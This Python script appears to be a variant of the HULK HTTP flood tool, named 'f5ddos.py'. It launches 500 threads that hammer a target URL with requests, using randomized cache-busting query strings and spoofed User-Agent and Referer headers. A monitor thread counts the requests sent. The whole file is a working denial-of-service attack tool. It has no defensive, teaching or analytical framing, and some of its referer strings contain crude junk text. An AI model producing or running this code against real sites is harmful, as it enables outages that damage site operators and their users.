import urllib.request
import sys
import threading
import random
import re

# global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0


def inc_counter():
    global request_counter
    request_counter += 1


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1


# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return headers_useragents


# generates a referer array
def referer_list():
    global headers_referers
    headers_referers.append('https://www.google.com/?q=')
    headers_referers.append('https://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
    headers_referers.append('https://vk.com/profile.php?redirect=')
    headers_referers.append('https://www.usatoday.com/search/results?q=')
    headers_referers.append('https://engadget.search.aol.com/search?q=query?=query=..')
    headers_referers.append(
        'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
    headers_referers.append(
        'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
    headers_referers.append('https://yandex.ru/yandsearch?text=')
    headers_referers.append(
        'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
    headers_referers.append('https://go.mail.ru/search?mail.ru=1&q=')
    headers_referers.append('https://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
    headers_referers.append('https://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
    headers_referers.append('https://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
    headers_referers.append('https://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
    headers_referers.append('https://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
    headers_referers.append('https://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
    headers_referers.append('https://www.google.ru/url?sa=t&rct=?j&q=&e..')
    headers_referers.append('https://help.baidu.com/searchResult?keywords=')
    headers_referers.append('https://www.bing.com/search?q=')
    headers_referers.append('https://www.yandex.com/yandsearch?text=')
    headers_referers.append('https://duckduckgo.com/?q=')
    headers_referers.append('https://www.ask.com/web?q=')
    headers_referers.append('https://search.aol.com/aol/search?q=')
    headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
    headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
    headers_referers.append('https://blekko.com/#ws/?q=')
    headers_referers.append('https://www.infomine.com/search/?q=')
    headers_referers.append('https://www.wolframalpha.com/input/?i=')
    headers_referers.append('https://' + host + '/')
    return headers_referers


# builds random ascii string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


def usage():
    print('---------------------------------------------------')
    print('USAGE: python f5ddos.py <url>')
    print('you can add "safe" after url, to autoshut after dos')
    print('---------------------------------------------------')


# http request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(
        url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Response Code 500')
        code = 500
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(request)
    return code


# http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) & (safe == 1):
                    set_flag(2)
        except Exception as ex:
            pass


# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                print("%d Requests Sent" % request_counter)
                previous = request_counter
        if flag == 2:
            print("\n-- HULK Attack Finished --")


# execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- Ddos F5 Attack Started --")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('https\://([^/]*)/?.*', url)
        host = m.group(1)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
